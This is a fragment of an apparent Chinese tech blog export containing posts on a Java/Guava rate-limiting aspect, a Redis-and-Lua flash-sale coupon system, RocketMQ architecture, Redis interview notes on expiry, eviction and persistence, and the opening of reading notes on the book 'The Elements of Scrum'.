<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Order(1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GuavaLimitAOP</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;execution(@RateConfigAnno * *(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">limit</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        <span class="comment">//1. 获取当前调用的方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">currentMethod</span> <span class="operator">=</span> getCurrentMethod(joinPoint);</span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(currentMethod)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 从方法注解定义上获取限流的类型</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">limitType</span> <span class="operator">=</span> currentMethod.getAnnotation(RateConfigAnno.class).limitType();</span><br><span class="line">        <span class="type">double</span> <span class="variable">limitCount</span> <span class="operator">=</span> currentMethod.getAnnotation(RateConfigAnno.class).limitCount();</span><br><span class="line">        <span class="comment">//3. 使用guava的令牌桶算法获取一个令牌，获取不到先等待</span></span><br><span class="line">        <span class="type">RateLimiter</span> <span class="variable">rateLimiter</span> <span class="operator">=</span> RateLimiterHelper.getRateLimiter(limitType, limitCount);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> rateLimiter.tryAcquire();</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;获取令牌成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;获取令牌失败&quot;</span>);</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getResponse();</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">            jsonObject.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            jsonObject.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;限流中&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                output(resp, jsonObject.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;error, e: &#123;&#125;&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Method <span class="title function_">getCurrentMethod</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        Method[] methods = joinPoint.getTarget().getClass().getMethods();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method.getName().equals(joinPoint.getSignature().getName())) &#123;</span><br><span class="line">                target = method;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">output</span><span class="params">(HttpServletResponse response, String msg)</span> &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream()) &#123;</span><br><span class="line">            outputStream.write(msg.getBytes());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="11-库存是怎么写到Redis的？"><a href="#11-库存是怎么写到Redis的？" class="headerlink" title="11. 库存是怎么写到Redis的？"></a>11. 库存是怎么写到Redis的？</h1><p>因为新增优惠券是商家端的操作，并发一般都比较小，所以我是直接在写数据库的同时写入缓存。</p>
<p>然后在服务启动的时候也需要把mysql中的库存同步到redis中，是写在了@PostConstruct注解下，表明这个方法需要在Bean加载前执行</p>
<h1 id="6-点赞功能如何实现的"><a href="#6-点赞功能如何实现的" class="headerlink" title="6. 点赞功能如何实现的"></a>6. 点赞功能如何实现的</h1><p>使用Set，因为Set类型的数据结构具有</p>
<ul>
<li>不重复，符合业务的特点，一个用户只能点赞一次</li>
<li>高性能，Set集合内部实现了高效的数据结构(Hash表)</li>
<li>灵活性，Set集合可以实现一对多，一个博客被多个用户点赞</li>
</ul>
<p>当然也可以选择使用Hash（Hash占用空间比Set更小），如果想要点赞排序也可以选用Sorted Set</p>
<h1 id="8-设计秒杀系统需要关注那些？"><a href="#8-设计秒杀系统需要关注那些？" class="headerlink" title="8. 设计秒杀系统需要关注那些？"></a>8. 设计秒杀系统需要关注那些？</h1><h2 id="高并发和高性能"><a href="#高并发和高性能" class="headerlink" title="高并发和高性能"></a>高并发和高性能</h2><p>①热点数据的处理：处理热点数据的问题的关键就在于 我们如何找到这些热点数据（或者说热 key），然后将它们存在 jvm 内存里。对于本项目来说，其实可以直接放入到redis即可，因为并发量不可能过高，但是如果是像京东那种，可能就直接把redis集群给干趴下了。</p>
<p>②通过消息队列来进行流量削峰。验证码和回答问题来筛选出可能存在的脚本。</p>
<h2 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h2><p>如果我们想要保证系统中某一个组件的高可用，往往需要搭建集群来避免单点风险，比如说 Nginx 集<br>群、Kafka 集群、Redis 集群（哨兵机制）。</p>
<p>限流：限流是从用户访问压力的角度来考虑如何应对系统故障。限流为了对服务端的接口接受请求的频率进行限制，防止服务挂掉。可以用redis，也可以用Sentinel。</p>
<p>排队：限流是直接拒绝用户的请求，而排队是让用户等待一定的时间。</p>
<p>降级：降级是从系统功能优先级的角度应对系统故障，比如请求到一定阈值之后，我们对系统中一些非核心的功能直接关闭或者让他们的功能降低。（比如双十一期间，蚂蚁森林等功能可以进行降低）</p>
<p>熔断：应对当前系统依赖的外部系统或者第三方系统的崩溃。例如秒杀服务位于服务A，A还有其他服务比如用户积分的管理，如果积分管理的服务接口响应特别慢的时候，其他服务直接不再请求这个接口，从而避免其他服务被这个服务拖累。</p>
<h2 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h2><p>减库存：下单减扣库存</p>
<p>接口幂等：分布式锁。我们通过加锁的方式限制用户在第一次请求未结束之前，无法进行第二次请求。</p>
<h1 id="如何解决超卖问题"><a href="#如何解决超卖问题" class="headerlink" title="如何解决超卖问题"></a>如何解决超卖问题</h1><p>通过加锁，悲观锁或者乐观锁，乐观锁分为版本号和CAS操作</p>
<p>本项目使用分布式锁 + lua脚本实现原子性</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> voucherId = ARGV[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">local</span> userId = ARGV[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">--- 库存key</span></span><br><span class="line"><span class="keyword">local</span> stockKey = <span class="string">&#x27;seckill:stock:&#x27;</span> .. voucherId</span><br><span class="line"><span class="comment">---·订单key</span></span><br><span class="line"><span class="keyword">local</span> orderKey = <span class="string">&#x27;seckill:order:&#x27;</span> .. voucherId</span><br><span class="line"></span><br><span class="line"><span class="comment">--- 判断库存是否充足</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">tonumber</span>(redis.call(<span class="string">&#x27;get&#x27;</span>, stockKey)) &lt;= <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--- 判断用户是否重复购买</span></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;sismember&#x27;</span>, orderKey, userId) == <span class="number">1</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--- 扣减库存，并记录用户购买信息</span></span><br><span class="line">redis.call(<span class="string">&#x27;incrby&#x27;</span>, stockKey, <span class="number">-1</span>)</span><br><span class="line">redis.call(<span class="string">&#x27;sadd&#x27;</span>, orderKey, userId)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h1 id="后续优化点"><a href="#后续优化点" class="headerlink" title="后续优化点"></a>后续优化点</h1><p>2.使用线程池实现查询商品详情信息等复杂任务的并行计算，并使用 Completableruture 异步编排任务，提高系统响应速度。</p>
<h1 id="用什么做并发测试？"><a href="#用什么做并发测试？" class="headerlink" title="用什么做并发测试？"></a>用什么做并发测试？</h1><p>jmeter</p>
<h1 id="10-数据库相关"><a href="#10-数据库相关" class="headerlink" title="10. 数据库相关"></a>10. 数据库相关</h1><h2 id="1-订单表-tb-voucher-order"><a href="#1-订单表-tb-voucher-order" class="headerlink" title="1. 订单表(tb_voucher_order)"></a>1. 订单表(tb_voucher_order)</h2><p>每个店铺都可以发布优惠券，当用户抢购优惠券时，会生成订单并保存到tb_voucher_order表中</p>
<h3 id="1-1-为什么订单表不使用数据库自增ID？"><a href="#1-1-为什么订单表不使用数据库自增ID？" class="headerlink" title="1.1 为什么订单表不使用数据库自增ID？"></a>1.1 为什么订单表不使用数据库自增ID？</h3><ul>
<li>id规律性太明显，容易被猜出来</li>
<li>随着订单增长，单张表数据量有限，分表多张表自增ID会重复</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>RocketMQ详解</title>
    <url>/2025/02/09/RocketMQ/</url>
    <content><![CDATA[<h2 id="消息队列的作用"><a href="#消息队列的作用" class="headerlink" title="消息队列的作用"></a>消息队列的作用</h2><ol>
<li>异步</li>
<li>解耦</li>
<li>削峰</li>
</ol>
<h2 id="RocketMQ的消息模型"><a href="#RocketMQ的消息模型" class="headerlink" title="RocketMQ的消息模型"></a>RocketMQ的消息模型</h2><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250311201626219.png" alt="image-20250311201626219" style="zoom:67%;" />

<ol>
<li>每个主题下有多个队列</li>
<li>一个消费者组共同消费一个主题，一个队列只会被一个消费者消费</li>
<li>不同消费者组中，每个消费者维护消费的队列已消费的位置（offset），防止重复消费</li>
</ol>
<h2 id="RocketMQ的架构图"><a href="#RocketMQ的架构图" class="headerlink" title="RocketMQ的架构图"></a>RocketMQ的架构图</h2><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250311202049950.png" alt="image-20250311202049950"></p>
<p><strong>NameServer</strong>：注册中心，进行Broker管理和路由管理。Broker会将自己的信息注册到NameServer中，消费者和生产者从NameServer中获取路由表然后照着路由表的信息和对应的Broker进行通信。</p>
<p><strong>Broker</strong>：消息队列服务器，负责消息的存储、投递、查询，保证高可用性。一个Topic分布在多个Broker上，而每个Broker可以配置多个Topic。</p>
<p><strong>Producer</strong>：生产者。</p>
<p><strong>Consumer</strong>：消费者。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250311202625113.png" alt="image-20250311202625113"></p>
<ol>
<li>Broker做了集群和主从部署。slave定时从master同步数据，当master宕机时，slave可以提供消费服务，但不能写入消息。</li>
<li>nameserver做了集群部署，且去中心化。每个broker与所有nameserver保持长连接，并且在每隔 30 秒broker会向所有nameserver发送心跳，心跳包含了自身的 <code>Topic</code> 配置信息。</li>
<li>在生产者需要向 Broker 发送消息的时候，需要先从 NameServer获取关于 Broker 的路由信息，然后通过 <strong>轮询</strong> 的方法去向每个队列中生产数据以达到 <strong>负载均衡</strong> 的效果。</li>
<li>消费者通过 NameServer 获取所有 Broker的路由信息后，向 Broker 发送 Pull请求来获取消息数据。Consumer可以以两种模式启动—— <strong>广播（Broadcast）和集群（Cluster）</strong>。广播模式下，一条消息会发送给 <strong>同一个消费组中的所有消费者</strong> ，集群模式下消息只会发送给一个消费者。</li>
</ol>
<h2 id="RocketMQ功能"><a href="#RocketMQ功能" class="headerlink" title="RocketMQ功能"></a>RocketMQ功能</h2><h3 id="普通消息"><a href="#普通消息" class="headerlink" title="普通消息"></a>普通消息</h3>]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>RocketMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis八股</title>
    <url>/2025/02/06/Redis%E5%85%AB%E8%82%A1/</url>
    <content><![CDATA[<h2 id="Redis过期key删除策略"><a href="#Redis过期key删除策略" class="headerlink" title="Redis过期key删除策略"></a>Redis过期key删除策略</h2><p>常用的过期数据的删除策略就下面这几种：</p>
<ol>
<li><strong>惰性删除</strong>：只会在取出&#x2F;查询 key 的时候才对数据进行过期检查。这种方式对 CPU 最友好，但是可能会造成太多过期 key 没有被删除。</li>
<li><strong>定期删除</strong>：周期性地随机从设置了过期时间的 key 中抽查一批，然后逐个检查这些 key 是否过期，过期就删除 key。相比于惰性删除，定期删除对内存更友好，对 CPU 不太友好。</li>
<li><strong>延迟队列</strong>：把设置过期时间的 key 放到一个延迟队列里，到期之后就删除 key。这种方式可以保证每个过期 key 都能被删除，但维护延迟队列太麻烦，队列本身也要占用资源。</li>
<li><strong>定时删除</strong>：每个设置了过期时间的 key 都会在设置的时间到达时立即被删除。这种方法可以确保内存中不会有过期的键，但是它对 CPU 的压力最大，因为它需要为每个键都设置一个定时器。</li>
</ol>
<p><strong>Redis 采用的那种删除策略呢？</strong></p>
<p>Redis 采用的是 <strong>定期删除+惰性&#x2F;懒汉式删除</strong> 结合的策略，这也是大部分缓存框架的选择。定期删除对内存更加友好，惰性删除对 CPU 更加友好。两者各有千秋，结合起来使用既能兼顾 CPU 友好，又能兼顾内存友好。</p>
<p>也就是，首先惰性删除，在查询一个 key 的时候，Redis 首先检查该 key 是否存在于过期字典中（时间复杂度为 O(1)），如果不在就直接返回，在的话需要判断一下这个 key 是否过期，过期直接删除 key 然后返回 null。</p>
<p>然后除此之外，Redis会有定期删除，也就是周期性地<strong>随机</strong>从设置了过期时间的key中抽查一批，看这些key是否过期。并且Redis设置了下面几个参数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ACTIVE_EXPIRE_CYCLE_SLOW_TIME_PERC 25 <span class="comment">/* Max % of CPU to use. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ACTIVE_EXPIRE_CYCLE_ACCEPTABLE_STALE 10 <span class="comment">/* % of stale keys after which we do extra efforts. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ACTIVE_EXPIRE_CYCLE_KEYS_PER_LOOP 20 <span class="comment">/* Keys for each DB loop. */</span></span></span><br><span class="line"># 默认为 <span class="number">10</span></span><br><span class="line">hz <span class="number">10</span></span><br><span class="line"># 默认开启</span><br><span class="line">dynamic-hz yes</span><br></pre></td></tr></table></figure>

<p>依次的含义如下：</p>
<ul>
<li><p><strong>每次执行时间最多为25ms</strong>，超过阈值则中断这一次定期删除循环，以避免使用过多的 CPU 时间。</p>
</li>
<li><p>如果这一批过期的 key 比例超过一个比例，就会重复执行此删除流程，以更积极地清理过期 key。相应地，如果<strong>过期的 key 比例低于这个比例，就会中断这一次定期删除循环</strong>，避免做过多的工作而获得很少的内存回收。</p>
</li>
<li><p>每次会随机选择 20 个设置了过期时间的 key 判断是否过期。</p>
</li>
<li><p>定期删除的频率是由 <strong>hz</strong> 参数控制的。hz 默认为 10，代表每秒执行 10 次，也就是每秒钟进行 10 次尝试来查找并删除过期的 key。</p>
<p>hz 的取值范围为 1~500。增大 hz 参数的值会提升定期删除的频率。如果你想要更频繁地执行定期删除任务，可以适当增加 hz 的值，但这会加 CPU 的使用率。根据 Redis 官方建议，hz 的值不建议超过 100，对于大部分用户使用默认的 10 就足够了。</p>
</li>
<li><p>dynamic-hz 这个参数开启之后 Redis 就会在 hz 的基础上动态计算一个值。Redis 提供并默认启用了使用自适应 hz 值的能力，</p>
</li>
</ul>
<h2 id="Redis内存淘汰机制"><a href="#Redis内存淘汰机制" class="headerlink" title="Redis内存淘汰机制"></a>Redis内存淘汰机制</h2><p>Redis 的内存淘汰策略只有在运行内存达到了配置的最大内存阈值时才会触发，这个阈值是通过<code>redis.conf</code>的<code>maxmemory</code>参数来定义的。64 位操作系统下，<code>maxmemory</code> 默认为 0 ，表示不限制内存大小。32 位操作系统下，默认的最大内存值是 3GB。</p>
<p>Redis 提供了 6 种内存淘汰策略：</p>
<ol>
<li><strong>volatile-lru</strong>：从已设置过期时间的数据集中挑选最近最少使用的数据淘汰。</li>
<li><strong>volatile-ttl</strong>：从已设置过期时间的数据集中挑选将要过期的数据淘汰。</li>
<li><strong>volatile-random</strong>：从已设置过期时间的数据集中任意选择数据淘汰。</li>
<li><strong>volatile-lfu</strong>：从已设置过期时间的数据集中挑选最不经常使用的数据淘汰。</li>
<li><strong>allkeys-lru</strong>：从数据集中移除最近最少使用的数据淘汰。</li>
<li><strong>allkeys-random</strong>：从数据集中任意选择数据淘汰。</li>
<li><strong>allkeys-lfu</strong>：从数据集中移除最不经常使用的数据淘汰。</li>
<li><strong>no-eviction</strong>（默认内存淘汰策略）：禁止驱逐数据，当内存不足以容纳新写入数据时，新写入操作会报错。</li>
</ol>
<h2 id="Redis持久化机制"><a href="#Redis持久化机制" class="headerlink" title="Redis持久化机制"></a>Redis持久化机制</h2><p>Redis支持三种持久化方式：</p>
<ul>
<li>RDB（快照）</li>
<li>AOF（只追加文件）</li>
<li>RDB 和 AOF 混合持久化</li>
</ul>
<h3 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h3><p>Redis 可以通过创建快照来获得存储在内存里面的数据在 <strong>某个时间点</strong> 上的副本。Redis 创建快照之后，可以对快照进行备份，可以将快照复制到其他服务器从而创建具有相同数据的服务器副本（Redis 主从结构，主要用来提高 Redis 性能），还可以将快照留在原地以便重启服务器的时候使用。</p>
<p>Redis 提供了两个命令来生成 RDB 快照文件：</p>
<ul>
<li><code>save</code> : 同步保存操作，会阻塞 Redis 主线程；</li>
<li><code>bgsave</code> : fork 出一个子进程，子进程执行，不会阻塞 Redis 主线程，默认选项。</li>
</ul>
<h3 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h3><p>开启 AOF 持久化后每执行一条会更改 Redis 中的数据的命令，Redis 就会将该命令写入到 AOF 缓冲区中，然后再写入到 AOF 文件中（此时还在系统内核缓存区未同步到磁盘），最后再根据持久化方式（ <code>fsync</code>策略）的配置来决定何时将系统内核缓存区的数据同步到硬盘中的。</p>
<p>AOF 持久化功能的实现可以简单分为 5 步：</p>
<ol>
<li><strong>命令追加（append）</strong>：所有的写命令会追加到 AOF 缓冲区中。</li>
<li><strong>文件写入（write）</strong>：将 AOF 缓冲区的数据写入到 AOF 文件中。这一步需要调用<code>write</code>函数（系统调用），<code>write</code>将数据写入到了系统内核缓冲区之后直接返回了（延迟写）。注意！！！此时并没有同步到磁盘。</li>
<li><strong>文件同步（fsync）</strong>：AOF 缓冲区根据对应的持久化方式（ <code>fsync</code> 策略）向硬盘做同步操作。这一步需要调用 <code>fsync</code> 函数（系统调用）， <code>fsync</code> 针对单个文件操作，对其进行强制硬盘同步，<code>fsync</code> 将阻塞直到写入磁盘完成后返回，保证了数据持久化。</li>
<li><strong>文件重写（rewrite）</strong>：随着 AOF 文件越来越大，需要定期对 AOF 文件进行重写，达到压缩的目的。</li>
<li><strong>重启加载（load）</strong>：当 Redis 重启时，可以加载 AOF 文件进行数据恢复。</li>
</ol>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250310143135656.png" alt="image-20250310143135656" style="zoom:50%;" />

<h4 id="三种AOF刷盘策略"><a href="#三种AOF刷盘策略" class="headerlink" title="三种AOF刷盘策略"></a>三种AOF刷盘策略</h4><p>在 Redis 的配置文件中存在三种不同的 AOF 持久化方式（ <code>fsync</code>策略），它们分别是：</p>
<ol>
<li><strong>Always</strong>：主线程调用 <code>write</code> 执行写操作后，后台线程立即会调用 <code>fsync</code> 函数同步 AOF 文件（刷盘），<code>fsync</code> 完成后线程返回，这样会严重降低 Redis 的性能（<code>write</code> + <code>fsync</code>）。</li>
<li><strong>Everysec</strong>：主线程调用 <code>write</code> 执行写操作后立即返回，由后台线程每秒钟调用 <code>fsync</code> 函数（系统调用）同步一次 AOF 文件（<code>write</code>+<code>fsync</code>，<code>fsync</code>间隔为 1 秒）</li>
<li><strong>No</strong>：主线程调用 <code>write</code> 执行写操作后立即返回，让操作系统决定何时进行同步，Linux 下一般为 30 秒一次（<code>write</code>但不<code>fsync</code>，<code>fsync</code> 的时机由操作系统决定）。</li>
</ol>
<h4 id="AOF为什么是在执行完命令之后记录日志？"><a href="#AOF为什么是在执行完命令之后记录日志？" class="headerlink" title="AOF为什么是在执行完命令之后记录日志？"></a>AOF为什么是在执行完命令之后记录日志？</h4><p>关系型数据库（如 MySQL）通常都是执行命令之前记录日志（方便故障恢复），而 Redis AOF 持久化机制是在执行完命令之后再记录日志。</p>
<ul>
<li>避免额外的检查开销，AOF 记录日志不会对命令进行语法检查；</li>
<li>在命令执行完之后再记录，不会阻塞当前的命令执行。</li>
</ul>
<p>这样也带来了风险：</p>
<ul>
<li>如果刚执行完命令 Redis 就宕机会导致对应的修改丢失；</li>
<li>可能会阻塞后续其他命令的执行（AOF 记录日志是在 Redis 主线程中进行的）。</li>
</ul>
<h4 id="AOF重写"><a href="#AOF重写" class="headerlink" title="AOF重写"></a>AOF重写</h4><p>当 AOF 变得太大时，Redis 能够在后台自动重写 AOF 产生一个新的 AOF 文件，这个新的 AOF 文件和原有的 AOF 文件所保存的数据库状态一样，但体积更小。</p>
<p>由于 AOF 重写会进行大量的写入操作，为了避免对 Redis 正常处理命令请求造成影响，Redis 将 AOF 重写程序放到子进程里执行。</p>
<p>AOF 文件重写期间，Redis 还会维护一个 <strong>AOF 重写缓冲区</strong>，该缓冲区会在子进程创建新 AOF 文件期间，记录服务器执行的所有写命令。当子进程完成创建新 AOF 文件的工作之后，服务器会将重写缓冲区中的所有内容追加到新 AOF 文件的末尾，使得新的 AOF 文件保存的数据库状态与现有的数据库状态一致。最后，服务器用新的 AOF 文件替换旧的 AOF 文件，以此来完成 AOF 文件重写操作。</p>
<h4 id="AOF校验"><a href="#AOF校验" class="headerlink" title="AOF校验"></a>AOF校验</h4><p>AOF 校验机制是 Redis 在启动时对 AOF 文件进行检查，以判断文件是否完整，是否有损坏或者丢失的数据。这个机制的原理其实非常简单，就是通过使用一种叫做 <strong>校验和（checksum）</strong> 的数字来验证 AOF 文件。这个校验和是通过对整个 AOF 文件内容进行 CRC64 算法计算得出的数字。如果文件内容发生了变化，那么校验和也会随之改变。因此，Redis 在启动时会比较计算出的校验和与文件末尾保存的校验和（计算的时候会把最后一行保存校验和的内容给忽略点），从而判断 AOF 文件是否完整。如果发现文件有问题，Redis 就会拒绝启动并提供相应的错误信息。AOF 校验机制十分简单有效，可以提高 Redis 数据的可靠性。</p>
<h3 id="RDB-vs-AOF"><a href="#RDB-vs-AOF" class="headerlink" title="RDB vs AOF"></a>RDB vs AOF</h3><p><strong>数据安全性</strong>：</p>
<ul>
<li>AOF提供更好的数据安全性，根据刷盘策略，当Redis服务宕机时，也只会丢失近一秒或者最后一次写入的数据。</li>
<li>RDB在两次快照之间，如果Redis服务宕机，这段数据会完全丢失。</li>
</ul>
<p><strong>占据空间</strong>：</p>
<ul>
<li>AOF存储每一次写命令，通常AOF文件都会更大，占据更多磁盘空间。</li>
<li>RDB存储经过压缩的二进制内容，文件更小。</li>
</ul>
<p><strong>恢复速度</strong>：</p>
<ul>
<li>使用AOF文件恢复数据，需要重写执行每一条命令，速度非常慢（特别是如果没有进行AOF重写）。</li>
<li>使用RDB文件恢复数据，直接解析还原数据即可，速度非常快。</li>
</ul>
<p><strong>性能影响</strong>：</p>
<ul>
<li>AOF的always刷盘策略会频繁进行磁盘IO吗，会对Redis的写入性能造成一定影响。</li>
<li>RDB使用bgsave生成策略时，创建子线程进行，不会阻塞主线程，对服务性能影响较小。</li>
</ul>
<h2 id="Redis线程模型"><a href="#Redis线程模型" class="headerlink" title="Redis线程模型"></a>Redis线程模型</h2><p><strong>Redis 基于 Reactor 模式设计开发了一套高效的事件处理模型</strong>，这套事件处理模型对应的是 Redis 中的文件事件处理器（file event handler）。由于文件事件处理器（file event handler）是单线程方式运行的，所以我们一般都说 Redis 是单线程模型。</p>
<p>Redis 通过 <strong>IO 多路复用程序</strong> 来监听来自客户端的大量连接（或者说是监听多个 socket），它会将感兴趣的事件及类型（读、写）注册到内核中并监听每个事件是否发生。<strong>I&#x2F;O 多路复用技术的使用让 Redis 不需要额外创建多余的线程来监听客户端的大量连接，降低了资源的消耗。</strong></p>
<h3 id="为什么使用单线程模型？"><a href="#为什么使用单线程模型？" class="headerlink" title="为什么使用单线程模型？"></a>为什么使用单线程模型？</h3><ul>
<li>单线程编程容易并且更容易维护；</li>
<li>Redis 的性能瓶颈不在 CPU ，主要在内存和网络；</li>
<li>避免了多线程之间的竞争，省去了多线程切换带来的时间和性能上的开销，而且也不会导致死锁问题。</li>
<li>通过 I&#x2F;O 多路复用机制，实现了一个 Redis 线程处理多个 IO 流的效果。</li>
</ul>
<h3 id="Redis哪些地方有多线程？"><a href="#Redis哪些地方有多线程？" class="headerlink" title="Redis哪些地方有多线程？"></a>Redis哪些地方有多线程？</h3><p><strong>多线程处理网络IO</strong>：</p>
<p>在Redis6.0之后，也采用了多个IO线程来处理网络请求，这是因为随着网络硬件的性能提升，Redis的瓶颈有时会出现在网络IO处理上。但是 Redis 的多线程只是在网络数据的读写这类耗时操作上使用了，执行命令仍然是单线程顺序执行。</p>
<p><strong>后台线程</strong>：</p>
<p>Redis有三个后台线程来处理一些费时的操作：</p>
<ul>
<li>通过 <code>bio_close_file</code> 后台线程来释放 AOF &#x2F; RDB 等过程中产生的临时文件资源。</li>
<li>通过 <code>bio_aof_fsync</code> 后台线程调用 <code>fsync</code> 函数将系统内核缓冲区还未同步到到磁盘的数据强制刷到磁盘（ AOF 文件）。</li>
<li>通过 <code>bio_lazy_free</code>后台线程释放大对象（已删除）占用的内存空间。</li>
</ul>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>《Scrum要素》读书笔记</title>
    <url>/2025/02/21/Scrum%E8%A6%81%E7%B4%A0%E8%AF%BB%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<h3 id="一、书名和作者"><a href="#一、书名和作者" class="headerlink" title="一、书名和作者"></a>一、书名和作者</h3><ul>
<li><strong>书名</strong>：《Scrum要素》（<em>The Elements of Scrum</em>）</li>
<li><strong>作者</strong>：Chris Sims，Hillary Louise Johnson</li>
</ul>
<h3 id="二、书籍概览"><a href="#二、书籍概览" class="headerlink" title="二、书籍概览"></a>二、书籍概览</h3><ul>
<li><strong>主要论点和结构</strong><br>本书是一部系统阐述敏捷项目管理框架Scrum的核心概念及其实践要点的书籍。全书以简单易懂的语言和丰富的实践案例，围绕Scrum的基本角色（如产品负责人、Scrum Master和开发团队）、关键活动（如每日站会、冲刺规划会、回顾会）以及核心价值观展开。作者用逐步引导的方式帮助读者掌握Scrum的关键要素，强调透明性、持续改进与团队协作的必要性。</li>
<li><strong>目标读者和应用场景</strong><br>本书面向对Scrum感兴趣的项目管理者、团队负责人以及软件开发团队成员，尤其适合希望通过敏捷方法改进团队生产力的从业者。其应用场景涵盖从初学者对Scrum的入门学习，到经验丰富的实践者对现有流程的改进优化。</li>
</ul>
<span id="more"></span>

<h3 id="三、核心观点与主题总结"><a href="#三、核心观点与主题总结" class="headerlink" title="三、核心观点与主题总结"></a>三、核心观点与主题总结</h3><p>Scrum作为敏捷开发的重要框架，其核心理念在于通过迭代和增量式开发提升团队效率与产品质量。本书全面阐释了这一框架的理论与实践，其中的核心观点有：</p>
<ol>
<li><p><strong>Scrum的价值观和原则</strong><br>Scrum的根本在于“敏捷”——即通过增量交付的方式，快速适应需求变化并优化项目管理效率。Scrum的五大价值观（承诺、专注、开放、尊重和勇气）贯穿其工作流程，强调团队之间的信任和协作。</p>
</li>
<li><p><strong>角色划分及其职责</strong></p>
<p>在Scrum框架中，作者详细分析了产品负责人（Product Owner）、Scrum Master和开发团队三种角色的职责及协作方式。特别强调了Scrum Master作为敏捷文化推动者的重要地位，他不仅是流程的维护者，还需解决团队的实际障碍。</p>
<ul>
<li>产品负责人（Product Owner）：负责管理产品待办列表（Product Backlog），确保团队的工作始终聚焦于最大价值的产出。</li>
<li>Scrum Master：作为流程的守护者和团队的引导者，Scrum Master负责清除障碍，确保团队严格遵循Scrum实践。</li>
<li>开发团队：由跨职能成员组成，负责在冲刺期间完成可交付的产品增量。团队结构强调小规模、协作和自主性。</li>
</ul>
</li>
